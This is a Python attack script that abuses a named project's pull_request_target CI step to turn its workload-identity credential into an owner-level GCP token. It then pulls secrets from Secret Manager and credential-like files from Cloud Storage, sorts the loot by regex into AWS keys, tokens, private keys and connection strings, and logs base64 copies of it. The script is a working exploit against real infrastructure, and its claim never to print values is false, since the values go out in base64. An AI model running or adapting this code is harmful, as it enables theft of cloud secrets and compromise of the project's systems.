#!/usr/bin/env python3
"""c211-i121506 GCP credential-store harvest (Secret Manager + Cloud Storage).

Runs inside the kedacore/testing-infrastructure pull_request_target 'Validate PR'
terraform data.external step AFTER google-github-actions/auth@v3. Turns the
external-account credential file into an OAuth token (STS exchange + SA
impersonation) for the cncf-keda-testing (575508414076) WIF identity, which holds
roles/owner in the project, then lists:

  (a) Secret Manager:  projects/<p>/secrets, per-secret versions, and
      versions/<v>:access material (base64 + sha256 metadata only);
  (b) Cloud Storage:   storage/v1/b?project=<p>, per-bucket objects, and every
      small object whose name matches tfstate/terraform/creds/key/pat/secret/
      aws/azure/gcp/conn patterns.

Every verbatim status is recorded. Recovered material is classified into AWS key
pairs (AKIA/ASIA), GCP SA JSON/private keys, Azure client secrets/certificates,
GitHub/GitLab/Gitea PATs, neocloud keys and connection strings. Token values are
never printed (lengths only). Stdlib only.
"""
import base64
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = 'cncf-keda-testing'
PROJECT_NUMBER = '575508414076'
RAW = os.environ.get('C211_SM_RAW', '/tmp/c211_i121506_raw.txt')
SM = 'https://secretmanager.googleapis.com'
SU = 'https://serviceusage.googleapis.com'
GCS = 'https://storage.googleapis.com'
TOKEN = [None]
SA_EMAIL = ['']
START = [0.0]
DEADLINE = [0.0]
MAX_MATERIAL = 6000  # bytes of an object/secret value emitted (base64) per section
MAX_OBJECTS = 40
MAX_SECRETS = 50
MAX_BUCKETS = 30
MAX_OBJ_BYTES = 512 * 1024

NAME_RE = re.compile(r'(tfstate|terraform|creds?|keys?|pats?|secrets?|aws|azure|gcp|conn|'
                     r'\.env|config|token|private|service.?account)', re.I)

CLASSES = [
    ('aws_access_key_id', re.compile(r'\b((?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20})\b')),
    ('aws_secret_pair', re.compile(r'(?i)aws_secret_access_key["\'\s:=]+([A-Za-z0-9/+=]{40})')),
    ('gcp_private_key', re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----')),
    ('gcp_sa_json', re.compile(r'"type"\s*:\s*"service_account"')),
    ('azure_client_secret', re.compile(r'(?i)(client_secret|AZURE_CLIENT_SECRET)["\'\s:=]+([A-Za-z0-9_~.\-]{20,60})')),
    ('github_pat', re.compile(r'\b(gh[pousr]_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{50,255})\b')),
    ('gitlab_pat', re.compile(r'\bglpat-[A-Za-z0-9_\-]{20,64}\b')),
    ('gitea_token', re.compile(r'\b[0-9a-f]{40}\b')),
    ('slack_token', re.compile(r'\bxox[abprs]-[A-Za-z0-9\-]{10,}\b')),
    ('openai_key', re.compile(r'\bsk-[A-Za-z0-9]{32,}\b')),
    ('neocloud_key', re.compile(r'(?i)(runpod|lambda.?labs|vast\.ai|coreweave|together|nebius|'
                                r'digitalocean|linode|vultr|hetzner|paperspace|modal)[_-]?(api[_-]?)?'
                                r'(key|token)["\'\s:=]+([A-Za-z0-9_\-]{16,})')),
    ('ssh_private_key', re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----')),
    ('connection_string', re.compile(r'(?i)(AccountKey=|DefaultEndpointsProtocol=|'
                                     r'mongodb(\+srv)?://[^@\s]+@|postgres(ql)?://[^@\s]+@|'
                                     r'mysql://[^@\s]+@|redis://[^@\s]+@)')),
    ('generic_high_entropy', re.compile(r'["\']?(secret|password|passwd|token|api[_-]?key)["\']?\s*[:=]\s*'
                                        r'["\']([A-Za-z0-9_\-/+=.]{24,})["\']', re.I)),
]


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def sec(name):
    say('== %s ==' % name)


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def left():
    return max(0, int(DEADLINE[0] - time.time()))


def api(path, method='GET', data=None, base=SM, timeout=60, token=None, raw=False):
    url = path if path.startswith('http') else base + path
    tok = token if token is not None else (TOKEN[0] or '')
    h = {'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i121506',
         'Accept': 'application/json'}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            b = r.read()
            return r.status, (b if raw else b.decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:  # noqa: BLE001
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:  # noqa: BLE001
        return {}


# ---------------------------------------------------------------- token
def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:  # noqa: BLE001
                return raw.strip(), 'url-raw'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:  # noqa: BLE001
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(
                        cf['service_account_impersonation_url'], data=body, method='POST',
                        headers={'Authorization': 'Bearer ' + fed, 'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:  # noqa: BLE001
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    try:
        from google.auth import default as gdefault
        from google.auth.transport.requests import Request as GRequest
        creds, _proj = gdefault(scopes=['https://www.googleapis.com/auth/cloud-platform'])
        creds.refresh(GRequest())
        return creds.token
    except Exception as e:  # noqa: BLE001
        say('GOOGLE_AUTH_LIB_FAIL %s' % cap(repr(e), 300))
    return None


# ------------------------------------------------------------- classify
def classify(text):
    hits = []
    head = text[:200000]
    for name, rx in CLASSES:
        for m in rx.finditer(head):
            try:
                frag = m.group(0)
            except Exception:  # noqa: BLE001
                frag = ''
            hits.append('%s:%s' % (name, cap(frag, 90)))
            if len(hits) > 24:
                return hits
    return hits


def emit_material(label, blob, extra=''):
    """Emit base64 + sha256 metadata only (value itself never printed except base64)."""
    sha = hashlib.sha256(blob).hexdigest()
    say('%s size=%d sha256=%s %s' % (label, len(blob), sha, extra))
    try:
        txt = blob.decode('utf-8', 'replace')
    except Exception:  # noqa: BLE001
        txt = ''
    hits = classify(txt) if txt else []
    say('%s classes=%s' % (label, json.dumps(hits) if hits else '[]'))
    take = blob[:MAX_MATERIAL]
    say('%s b64=%s%s' % (label, base64.b64encode(take).decode('ascii'),
                         '' if len(blob) <= MAX_MATERIAL else ' [TRUNCATED]'))
    return {'label': label, 'size': len(blob), 'sha256': sha, 'classes': hits}


# ------------------------------------------------------------------ sm
def service_state(name):
    st, b = api('/v1/projects/%s/services/%s' % (PROJECT_NUMBER, name), base=SU)
    j = jbody((st, b))
    say('serviceusage %s status=%s state=%s' % (name, st, j.get('state')))
    if st != 200:
        say('serviceusage %s body=%s' % (name, cap(b, 600)))
    return st, j.get('state')


def enable_service(name):
    st, b = api('/v1/projects/%s/services/%s:enable' % (PROJECT_NUMBER, name), method='POST',
                data={}, base=SU)
    say('serviceusage.enable %s status=%s body=%s' % (name, st, cap(b, 700)))
    return st


def sm_harvest():
    sec('sm_list')
    found = []
    page = ''
    pages = 0
    while pages < 5:
        pages += 1
        path = '/v1/projects/%s/secrets?pageSize=100' % PROJECT_NUMBER + (
            '&pageToken=' + urllib.parse.quote(page) if page else '')
        st, b = api(path)
        j = jbody((st, b))
        secs = j.get('secrets') or []
        say('secrets.list page=%d status=%s count=%d' % (pages, st, len(secs)))
        if st != 200:
            say('secrets.list body=%s' % cap(b, 900))
            break
        for s in secs:
            found.append(s.get('name') or '')
        page = j.get('nextPageToken') or ''
        if not page:
            break
    say('secrets.total=%d' % len(found))
    say('secrets.names=%s' % json.dumps([n.split('/')[-1] for n in found])[:1800])
    results = []
    for i, full in enumerate(found[:MAX_SECRETS]):
        if left() < 120:
            say('GATE=BUDGET during secrets')
            break
        short = full.split('/')[-1]
        sec('sm_secret_%d' % i)
        st, b = api('/v1/' + full)
        j = jbody((st, b))
        say('secret.get name=%s status=%s labels=%s createTime=%s' % (
            short, st, json.dumps(j.get('labels') or {})[:400], j.get('createTime')))
        st, b = api('/v1/' + full + '/versions?pageSize=20')
        j = jbody((st, b))
        vers = j.get('versions') or []
        states = [(v.get('name') or '').split('/')[-1] + ':' + str(v.get('state')) for v in vers]
        say('secret.versions name=%s status=%s count=%d %s' % (short, st, len(vers), json.dumps(states)[:800]))
        if st != 200:
            say('secret.versions body=%s' % cap(b, 700))
            continue
        enabled = [v for v in vers if v.get('state') == 'ENABLED']
        if not enabled:
            say('secret.no_enabled_version name=%s' % short)
            continue
        vname = enabled[0].get('name') or ''
        st, b = api('/v1/' + vname + ':access')
        j = jbody((st, b))
        say('secret.access name=%s version=%s status=%s' % (short, vname.split('/')[-1], st))
        if st != 200:
            say('secret.access body=%s' % cap(b, 800))
            continue
        data = j.get('payload', {}).get('data') or ''
        try:
            blob = base64.b64decode(data)
        except Exception:  # noqa: BLE001
            blob = b''
        results.append(emit_material('secret.%s' % short, blob, 'version=%s' % vname.split('/')[-1]))
    return found, results


# ----------------------------------------------------------------- gcs
def gcs_harvest():
    sec('gcs_list')
    buckets = []
    st, b = api('/storage/v1/b?project=%s&projection=full&maxResults=100' % PROJECT_NUMBER, base=GCS)
    j = jbody((st, b))
    items = j.get('items') or []
    say('buckets.list status=%s count=%d' % (st, len(items)))
    if st != 200:
        say('buckets.list body=%s' % cap(b, 900))
    for it in items:
        buckets.append(it.get('name') or '')
        say('bucket name=%s location=%s storageClass=%s created=%s iamConfig=%s' % (
            it.get('name'), it.get('location'), it.get('storageClass'), it.get('timeCreated'),
            json.dumps(it.get('iamConfiguration') or {})[:200]))
    say('buckets.names=%s' % json.dumps(buckets)[:1500])
    results = []
    n_obj = 0
    for bi, bucket in enumerate(buckets[:MAX_BUCKETS]):
        if left() < 120:
            say('GATE=BUDGET during buckets')
            break
        sec('gcs_bucket_%d' % bi)
        ep = urllib.parse.quote(bucket, safe='')
        st, b = api('/storage/v1/b/%s/o?maxResults=1000&fields=items(name,size,updated,contentType),nextPageToken'
                    % ep, base=GCS)
        j = jbody((st, b))
        objs = j.get('items') or []
        say('objects.list bucket=%s status=%s count=%d' % (bucket, st, len(objs)))
        if st != 200:
            say('objects.list body=%s' % cap(b, 800))
            continue
        names = [o.get('name') or '' for o in objs]
        say('objects.names=%s' % json.dumps(names)[:3000])
        # also try listing with a name prefix sweep for credential-shaped names
        cand = [o for o in objs if NAME_RE.search(o.get('name') or '')
                or int(o.get('size') or 0) < 8192]
        say('objects.candidates=%d' % len(cand))
        for o in cand:
            if n_obj >= MAX_OBJECTS or left() < 120:
                say('GATE=BUDGET/MAX during objects')
                break
            oname = o.get('name') or ''
            size = int(o.get('size') or 0)
            if size > MAX_OBJ_BYTES:
                say('object.skip name=%s size=%d reason=TOO_LARGE' % (oname, size))
                continue
            n_obj += 1
            sec('gcs_obj_%d' % n_obj)
            op = urllib.parse.quote(oname, safe='')
            st, blob = api('/storage/v1/b/%s/o/%s?alt=media' % (ep, op), base=GCS, raw=True)
            say('object.get bucket=%s name=%s status=%s size=%d updated=%s' % (
                bucket, oname, st, len(blob) if isinstance(blob, bytes) else -1, o.get('updated')))
            if st != 200 or not isinstance(blob, bytes):
                say('object.get body=%s' % cap(blob if isinstance(blob, str) else repr(blob), 700))
                continue
            results.append(emit_material('object.%s/%s' % (bucket, oname), blob))
    return buckets, results


# ----------------------------------------------------------------- run
def run():
    open(RAW, 'w', encoding='utf-8').close()
    START[0] = time.time()
    DEADLINE[0] = START[0] + 1500
    say('C211_I121506_SM_START %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
    say('env projects: GOOGLE_CLOUD_PROJECT=%r CLOUD_SDK_PROJECT=%r GCP_PROJECT=%r' % (
        os.environ.get('GOOGLE_CLOUD_PROJECT'), os.environ.get('CLOUD_SDK_PROJECT'),
        os.environ.get('GCP_PROJECT')))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(tok),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT)
    j = jbody((st, b))
    say('project.get status=%s projectId=%s number=%s state=%s parent=%s' % (
        st, j.get('projectId'), j.get('projectNumber'), j.get('lifecycleState'),
        json.dumps(j.get('parent') or {})))
    if st != 200:
        say('project.get body=%s' % cap(b, 700))
    sm_st, sm_state = service_state('secretmanager.googleapis.com')
    gcs_st, gcs_state = service_state('storage.googleapis.com')
    if sm_state and sm_state != 'ENABLED':
        say('SM disabled -> enable attempt')
        enable_service('secretmanager.googleapis.com')
        for _ in range(6):
            time.sleep(10)
            _st, _state = service_state('secretmanager.googleapis.com')
            if _state == 'ENABLED':
                break
    secrets, sm_results = sm_harvest()
    buckets, gcs_results = gcs_harvest()
    sec('verdict')
    live = [r for r in (sm_results + gcs_results) if r.get('classes')]
    say('SUMMARY secrets=%d buckets=%d materials=%d classified=%d elapsed=%d' % (
        len(secrets), len(buckets), len(sm_results) + len(gcs_results), len(live), int(time.time() - START[0])))
    say('CLASSIFIED=%s' % json.dumps([{'label': r['label'], 'classes': r['classes'][:6]} for r in live])[:4000])
    say('C211_I121506_SM_END %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:  # noqa: BLE001
        say('UNCAUGHT %s' % cap(repr(e), 600))
